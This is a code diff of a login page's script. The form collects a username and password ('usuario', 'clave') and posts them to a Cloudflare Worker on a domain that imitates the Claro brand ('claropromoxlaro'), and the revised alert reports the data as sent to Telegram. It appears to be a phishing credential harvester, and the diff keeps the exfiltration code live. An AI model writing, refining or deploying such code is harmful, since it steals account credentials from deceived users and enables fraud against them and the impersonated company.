@@ -19,17 +19,21 @@
   <script>
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
+      
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev", {
+      // URL de tu Worker en Cloudflare
+      const url = "https://blue-night-7897.claropromoxlaro.workers.dev";
+
+      const res = await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ usuario, clave })
       });
 
       const data = await res.json();
-      alert(data.message || "Enviado ✅");
+      alert(data.ok ? "✅ Enviado a Telegram" : "❌ Error: " + data.error);
     });
   </script>
 </body>
